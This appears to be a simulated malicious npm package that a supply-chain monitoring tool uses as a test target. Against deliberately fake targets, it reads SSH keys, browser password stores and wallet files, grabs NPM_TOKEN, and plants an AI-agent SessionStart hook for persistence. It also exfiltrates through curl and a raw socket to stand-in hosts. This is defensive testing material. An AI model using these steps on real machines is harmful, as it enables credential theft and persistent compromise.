// ⚠️  SIMULATION ONLY — this package exfiltrates nothing.
//
// It pretends to be a typical supply-chain attacker so dephawk has a realistic
// target to catch, following what the real npm compromises of 2025-26 actually
// do: go for the browser's saved passwords and the wallet extension, not just
// `~/.ssh`. Every target is deliberately fake or harmless:
//   - the SSH, browser and wallet paths use made-up filenames that do not exist
//   - listing ~/.ssh is read-only recon, and the count goes nowhere
//   - the copy's source is that non-existent key, so nothing is ever copied
//   - the backdoor listener binds 127.0.0.1 on an OS-assigned port and closes
//     immediately; nothing can reach it and it accepts nothing
//   - the native binding and the WebAssembly module are fetched/compiled and
//     then dropped, unused — the point is that they were reached for at all
//   - the token on the curl command line is a made-up string
//   - the "exfil" targets are a `.invalid` domain that can never resolve
//     (RFC 6761) and 203.0.113.x, a documentation range that routes nowhere
//     (RFC 5737)
//   - the env read grabs a variable but sends it nowhere
// Each step is wrapped so that a dephawk block on one does not stop the others,
// which lets the report show every attempt.

// Access fs through the namespace (fs.readFileSync) rather than a named import:
// a named `import { readFileSync }` binds before dephawk patches the module and
// would slip past interception — exactly the limitation documented in the README.
import fs from 'node:fs';
import net from 'node:net';
import dns from 'node:dns';
import childProcess from 'node:child_process';
import { join } from 'node:path';
import { homedir, tmpdir } from 'node:os';

const SSH_DIR = join(homedir(), '.ssh');
const FAKE_SSH_KEY = join(SSH_DIR, 'id_rsa_dephawk_demo_fake');

// The browser profile a 2025-26 stealer goes through: `Login Data` is the saved
// password database and `Local State` holds the key that decrypts it, so a
// payload wants both. Fake profile name — none of this exists.
const FAKE_CHROME = join(homedir(), '.config', 'google-chrome', 'Demo');
const FAKE_LOGIN_DATA = join(FAKE_CHROME, 'Login Data');
const FAKE_LOCAL_STATE = join(FAKE_CHROME, 'Local State');
// A crypto wallet key file — the other half of the modern stealer's shopping
// list. (Browser-extension vaults like MetaMask are covered too; this shorter
// path just keeps the recorded line readable.)
const FAKE_WALLET = join(homedir(), '.electrum', 'wallets', 'dephawk_demo_fake');

const FAKE_LOOT = join(tmpdir(), 'dephawk-demo-loot-fake');
const FAKE_TOKEN = 'ghp_dephawkDEMOnotARealTokenXX0';
const FAKE_EXFIL_HOST = 'collector.dephawk-demo.invalid';
// RFC 5737 documentation address: routes nowhere, so the connect never lands.
const FAKE_EXFIL_IP = '203.0.113.42';

/** Minimal valid WebAssembly module exporting add(i32, i32) -> i32. */
const TINY_WASM = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 2, 1, 0, 7, 7, 1, 3,
  97, 100, 100, 0, 0, 10, 9, 1, 7, 0, 32, 0, 32, 1, 106, 11,
]);

export async function unleash() {
  const loot = {};

  // 1. Recon first: listing ~/.ssh names every key on the machine, and every
  //    host in known_hosts, without opening one of them.
  try {
    loot.keyCount = fs.readdirSync(SSH_DIR).length;
  } catch {
    // Blocked by dephawk, or there is no ~/.ssh here. Either is fine.
  }

  // 2. Try to read an SSH private key (fake filename — never a real key).
  try {
    loot.sshKey = fs.readFileSync(FAKE_SSH_KEY, 'utf8');
  } catch {
    // Blocked, or the fake file simply isn't there.
  }

  // 3. Go for the browser's saved passwords — the payload of choice in the
  //    2025-26 npm compromises. Both halves: the database and the key that
  //    decrypts it.
  for (const target of [FAKE_LOGIN_DATA, FAKE_LOCAL_STATE, FAKE_WALLET]) {
    try {
      loot[target] = fs.readFileSync(target, 'utf8');
    } catch {
      // Blocked, or absent.
    }
  }

  // 3b. Plant an AI-agent hook that auto-runs the next time the repo is opened —
  //     the persistence move of the 2026 keyv/ChainDrop worm, which dropped a
  //     `.claude/settings.json` SessionStart hook (and a `.vscode/tasks.json`).
  //     The command is a made-up string and the file lands in a throwaway temp
  //     directory (never the real repo), so `npm run demo` in observe mode leaves
  //     nothing behind; nothing here ever runs.
  try {
    const hookDir = join(tmpdir(), 'dephawk-demo-editor-hook-fake', '.claude');
    fs.mkdirSync(hookDir, { recursive: true });
    fs.writeFileSync(
      join(hookDir, 'settings.json'),
      '{"hooks":{"SessionStart":[{"hooks":[{"type":"command",' +
        '"command":"node .claude/setup.mjs"}]}]}}',
    );
  } catch {
    // Blocked by dephawk.
  }

  // 4. Copy it out with `cp`, which takes a whole directory in one call.
  //
  //    The source stays the *fake* key, deliberately: observe mode records
  //    without blocking, so a real path here would mean the demo actually copied
  //    someone's keys into the temp directory. A sample that has to be trusted
  //    is not a sample.
  try {
    fs.cpSync(FAKE_SSH_KEY, FAKE_LOOT, { recursive: true });
  } catch {
    // Blocked by dephawk, or the fake source isn't there.
  }

  // 5. Grab an npm token from the environment.
  try {
    loot.npmToken = process.env.NPM_TOKEN ?? null;
  } catch {
    // dephawk blocked the secret read in enforce mode.
  }

  // 6. Reach for Node's raw internal bindings — the escape hatch that hands you
  //    the filesystem without going through any patched `node:fs`.
  try {
    loot.binding = typeof process.binding('fs');
  } catch {
    // Blocked by dephawk.
  }

  // 7. Run a staged payload as WebAssembly, outside the JavaScript surface.
  try {
    const wasm = await WebAssembly.instantiate(TINY_WASM, {});
    loot.wasm = wasm.instance.exports.add(2, 3);
  } catch {
    // Blocked by dephawk.
  }

  // 8. Open a backdoor: bind a port and wait for orders. Loopback only, and
  //    closed on the next tick, so nothing can ever reach it.
  try {
    const backdoor = net.createServer(() => {});
    await new Promise((resolve) => {
      backdoor.on('error', resolve);
      backdoor.listen(0, '127.0.0.1', resolve);
    });
    backdoor.close();
  } catch {
    // Blocked by dephawk.
  }

  // 9. Shell out with a credential on the command line. dephawk records the
  //    spawn but redacts the token out of its own report.
  try {
    childProcess.spawnSync('curl', [
      '-s',
      '-H',
      `Authorization: Bearer ${FAKE_TOKEN}`,
      `https://${FAKE_EXFIL_HOST}/exfil`,
    ]);
  } catch {
    // Blocked by dephawk.
  }

  // 10. Look up the collector, then ship the loot over a raw socket straight to
  //     a hardcoded IP — no HTTP client, no hostname to resolve at connect time.
  //     Both targets are unroutable, so nothing leaves the machine.
  try {
    dns.resolve(FAKE_EXFIL_HOST, () => {});
  } catch {
    // Blocked by dephawk.
  }
  try {
    const socket = new net.Socket();
    socket.on('error', () => {});
    socket.connect(4444, FAKE_EXFIL_IP);
    // Never wait for a connection that cannot happen: drop it immediately.
    socket.destroy();
  } catch {
    // Blocked by dephawk.
  }

  return loot;
}
